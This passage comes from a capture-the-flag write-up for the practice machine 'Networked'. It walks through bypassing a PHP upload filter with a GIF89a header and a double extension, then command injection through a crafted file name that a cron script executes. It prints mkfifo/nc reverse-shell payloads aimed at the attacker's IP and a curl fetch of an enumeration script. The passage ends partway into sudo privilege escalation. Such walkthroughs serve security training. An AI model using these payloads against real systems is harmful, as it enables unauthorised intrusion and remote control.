</pre></table></code></div></div><p>Hm… <code class="language-plaintext highlighter-rouge">upload</code> and <code class="language-plaintext highlighter-rouge">gallery</code>? Unfortunately, appending them to the URL gives us a <code class="language-plaintext highlighter-rouge">404</code>. Looks like we have to brute force the directory and files. I will be using <code class="language-plaintext highlighter-rouge">gobuster</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://networked.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-t</span> 200
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://networked.htb
<span class="o">[</span>+] Threads:        200
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2019/08/31 21:54:19 Starting gobuster
<span class="o">===============================================================</span>
/uploads <span class="o">(</span>Status: 301<span class="o">)</span>
/backup <span class="o">(</span>Status: 301<span class="o">)</span>
<span class="o">===============================================================</span>
2019/08/31 21:59:28 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>On <code class="language-plaintext highlighter-rouge">/backup</code> we get a directory listing which only contains <code class="language-plaintext highlighter-rouge">backup.tar</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked1.png" alt="" /></p><p>After downloading <code class="language-plaintext highlighter-rouge">backup.tar</code>, we extract all of its contents.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xvf</span> backup.tar
index.php
lib.php
photos.php
upload.php
</pre></table></code></div></div><p>Seems like the contents of web server? Maybe this is a backup of the current web server?</p><p><code class="language-plaintext highlighter-rouge">upload.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked2.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">photos.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked3.png" alt="" /></p><p>Lets try to upload an image into the web server! We clicked on <code class="language-plaintext highlighter-rouge">Browse</code>, selected our picture and hit <code class="language-plaintext highlighter-rouge">go!</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked4.png" alt="" /></p><p>Done! If we visit <code class="language-plaintext highlighter-rouge">photos.php</code> again,</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked5.png" alt="" /></p><p>We see a new picture which has a name containing our IP address but with the periods replaced with underscores. Another thing to note is that the extensions were maintained as well.</p><p>Since we can upload files onto the server, lets try to upload a <code class="language-plaintext highlighter-rouge">.php</code> file which will establish a reverse connection by to our listener!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">reverseconn.php</code>:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked6.png" alt="" /></p><p>Looks like our file got rejected :( Since we already have the source code for <code class="language-plaintext highlighter-rouge">upload.php</code>, lets check it out.</p><p>The first to look at is this:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$myFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
      <span class="nf">displayform</span><span class="p">();</span>
    <span class="p">}</span>

</pre></table></code></div></div><p>Since we know our file doesnt exceed 60Mb, we can focus on <code class="language-plaintext highlighter-rouge">check_file_type</code>. This function is located in <code class="language-plaintext highlighter-rouge">lib.php</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">check_file_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nf">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="s1">'image/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>  
<span class="p">}</span>

<span class="k">function</span> <span class="n">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'finfo_file'</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="no">FILEINFO_MIME</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">))</span> <span class="c1">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system</span>
    <span class="p">{</span>
      <span class="nv">$mime</span> <span class="o">=</span> <span class="o">@</span><span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
      <span class="nb">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$mime</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mime_content_type'</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="nv">$file_type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$file_type</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// It's possible that mime_content_type() returns FALSE or an empty string</span>
    <span class="p">{</span>
      <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'type'</span><span class="p">];</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Judging from the code, it seems like it is checking the MIME Content-type of the file. Examples of MIME Content-types include <code class="language-plaintext highlighter-rouge">image/jpeg</code>, <code class="language-plaintext highlighter-rouge">text/html</code>, <code class="language-plaintext highlighter-rouge">application/json</code>. This is done by checking the file header bytes and using a MIME database file to determine the Content-Type.</p><p>Looks like the Content-Type needs to contain <code class="language-plaintext highlighter-rouge">image/</code>, such as <code class="language-plaintext highlighter-rouge">image/png</code>, <code class="language-plaintext highlighter-rouge">image/jpeg</code> and <code class="language-plaintext highlighter-rouge">image/gif</code>.</p><p>With this knowledge, we know that we need to trick the web server into thinking our file is an image. This can actually be done by prepending <code class="language-plaintext highlighter-rouge">GIF89a</code> to <code class="language-plaintext highlighter-rouge">reverseconn.php</code>!</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>GIF89a
<span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>To find out if it works, we use the <code class="language-plaintext highlighter-rouge">file</code> command, which uses the same way to determine the file type.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file reverseconn.php
reverseconn.php: GIF image data 16188 x 26736
</pre></table></code></div></div><p>Isn’t that magical? XD</p><p>Next up, we have another section that checks the extension of the file against a list of image extensions.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
    <span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">'.png'</span><span class="p">,</span> <span class="s1">'.gif'</span><span class="p">,</span> <span class="s1">'.jpeg'</span><span class="p">);</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>If we renamed our file from <code class="language-plaintext highlighter-rouge">reverseconn.php</code> to <code class="language-plaintext highlighter-rouge">reverseconn.jpeg</code> and try to upload it, the file will be uploaded successfully. However, the file will be treated as an image by the web server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked7.png" alt="" /></p><p>The function that returns the extension of the file is <code class="language-plaintext highlighter-rouge">getnameUpload</code>, which is located in <code class="language-plaintext highlighter-rouge">lib.php</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">getnameUpload</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>After reading the code, we understand that the extension taken from the second period onwards. So if our file name is <code class="language-plaintext highlighter-rouge">reverseconn.php.jpeg</code>, the extension will be returned will be <code class="language-plaintext highlighter-rouge">.php.jpeg</code>. Lets rename our file to <code class="language-plaintext highlighter-rouge">reverseconn.php.jpeg</code> to see what happens.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XXX.XXX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.146] 36758
sh: no job control <span class="k">in </span>this shell
sh-4.2<span class="nv">$ </span><span class="nb">whoami
</span>apache
</pre></table></code></div></div><p>Alright it worked! But why? Shouldn’t the file still be treated as <code class="language-plaintext highlighter-rouge">.jpeg</code> file since it ends with it? Since we already have a shell as <code class="language-plaintext highlighter-rouge">apache</code>, lets check out the config for the <code class="language-plaintext highlighter-rouge">apache</code> service.</p><p><code class="language-plaintext highlighter-rouge">/etc/httpd/conf.d/php.conf</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AddHandler php5-script .php
</pre></table></code></div></div><p>According to <code class="language-plaintext highlighter-rouge">apache</code>’s documentation, if more than one extension is given that maps onto the same type of metadata, then the one to the right will be used, which would mean that <code class="language-plaintext highlighter-rouge">.jpeg</code> will be used in this case. However, due to the line in <code class="language-plaintext highlighter-rouge">php.conf</code>, any file with the name containing <code class="language-plaintext highlighter-rouge">.php</code> will be treated as a <code class="language-plaintext highlighter-rouge">PHP</code> script by the web server.</p><p>Continuing on, lets see what other users are available on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>sh-4.2<span class="nv">$ </span><span class="nb">ls</span> /home
<span class="nb">ls</span> /home
guly
</pre></table></code></div></div><p>However when we try to read <code class="language-plaintext highlighter-rouge">user.txt</code>,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>sh-4.2<span class="nv">$ </span><span class="nb">cat</span> /home/guly/user.txt
<span class="nb">cat</span> /home/guly/user.txt
<span class="nb">cat</span>: /home/guly/user.txt: Permission denied
</pre></table></code></div></div><p>Looks like we need to log in as user <code class="language-plaintext highlighter-rouge">guly</code>. If we check the home directory of <code class="language-plaintext highlighter-rouge">guly</code>,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>sh-4.2<span class="nv">$ </span><span class="nb">ls</span> /home/guly
<span class="nb">ls
</span>check_attack.php
crontab.guly
user.txt
</pre></table></code></div></div><p>Checking <code class="language-plaintext highlighter-rouge">crontab.guly</code>,</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*/3 * * * * php /home/guly/check_attack.php
</pre></table></code></div></div><p>It contains a crontab entry which runs the <code class="language-plaintext highlighter-rouge">check_attack.php</code> script every 3 minutes. Checking <code class="language-plaintext highlighter-rouge">check_attack.php</code>,</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>

<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/^([^.])/'</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">#echo "-------------\n";</span>

  <span class="c1">#print "check: $value\n";</span>
  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
  <span class="nv">$check</span> <span class="o">=</span> <span class="nf">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="c1"># todo: attach file</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="no">FILE_APPEND</span> <span class="o">|</span> <span class="no">LOCK_EX</span><span class="p">);</span>

    <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>It scans for all files in the <code class="language-plaintext highlighter-rouge">/var/www/html/uploads</code> folder, extract the file names without the extensions and check each one of them if they match the naming format that <code class="language-plaintext highlighter-rouge">upload.php</code> uses, which means that it has to look like <code class="language-plaintext highlighter-rouge">10_10_XXX_XXX.png</code> or <code class="language-plaintext highlighter-rouge">127_0_0_1.png</code>. And if they don’t, it will be logged as an attack attempt and certain commands will be executed.</p><p>The best part? Looks like we can inject some commands using the <code class="language-plaintext highlighter-rouge">$value</code> variable, which is the filename of the file. Lets create another listener</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1338
listening on <span class="o">[</span>any] 1338 ...
</pre></table></code></div></div><p>and create a file in <code class="language-plaintext highlighter-rouge">/var/www/html/uploads/</code> with a very specially crafted name.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sh-4.2$ touch "/var/www/html/uploads/; nc -c bash 10.10.XXX.XXX 1338;"
</pre></table></code></div></div><p>With this file name, it will definitely be logged as an attack attempt and trigger the command to be executed.</p><h1 id="usertxt">user.txt</h1><p>After a while (due to the <code class="language-plaintext highlighter-rouge">check_attack.php</code> running every 3 minutes), we get a shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XXX.XXX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.146] 39656
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">cat </span>user.txt
526cXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>To quickly enumerate for possible privilege escalation vectors, I will using <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>. To transfer it from my machine to this machine, I will be using <code class="language-plaintext highlighter-rouge">python</code>’s <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> module.</p><p>On my machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
<span class="nv">$ </span><span class="nb">cd </span>httpserver
<span class="nv">$ </span><span class="nb">cp</span> ~/Downloads/LinEnum.sh <span class="nb">.</span>
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></table></code></div></div><p>On the <code class="language-plaintext highlighter-rouge">Networked</code> machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">cd</span> /tmp
<span class="o">[</span>guly@networked /tmp]<span class="nv">$ </span>curl http://10.10.XXX.XXX/LinEnum.sh <span class="o">&gt;</span> LinEnum.sh
curl 10.10.XX.XX/LinEnum.sh <span class="o">&gt;</span> LinEnum.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 45651  100 45651    0     0  41674      0  0:00:01  0:00:01 <span class="nt">--</span>:--:-- 41690
</pre></table></code></div></div><p>When I ran it, I saw something interesting!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">[</span>guly@networked /tmp]<span class="nv">$ </span><span class="nb">chmod </span>777 LinEnum.sh
<span class="o">[</span>guly@networked /tmp]<span class="nv">$ </span>./LinEnum.sh
...
User guly may run the following commands on networked:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/changename.sh


<span class="o">[</span>+] Possible <span class="nb">sudo </span>pwnage!
/usr/local/sbin/changename.sh
</pre></table></code></div></div><p>That was easy. This means that we can just <code class="language-plaintext highlighter-rouge">sudo /usr/local/sbin/changename.sh</code> and be on our jolly way. But here comes the tough part.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash -p</span>
<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
</span><span class="no">EoF

</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>

<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
	</span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
	<span class="nb">read </span>x
	<span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
		</span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
		<span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
		<span class="nb">read </span>x
	<span class="k">done
	</span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
<span class="k">done</span>
  
/sbin/ifup guly0
</pre></table></code></div></div><p>Before we start analysing, lets run it first.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="o">[</span>guly@networked /tmp]<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/sbin/changename.sh
<span class="nb">sudo</span> /usr/local/sbin/changename.sh
interface NAME:
<span class="nb">test
test
</span>interface PROXY_METHOD:
<span class="nb">test
test
</span>interface BROWSER_ONLY:
<span class="nb">test
test
</span>interface BOOTPROTO:
<span class="nb">test
test
</span>ERROR     : <span class="o">[</span>/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
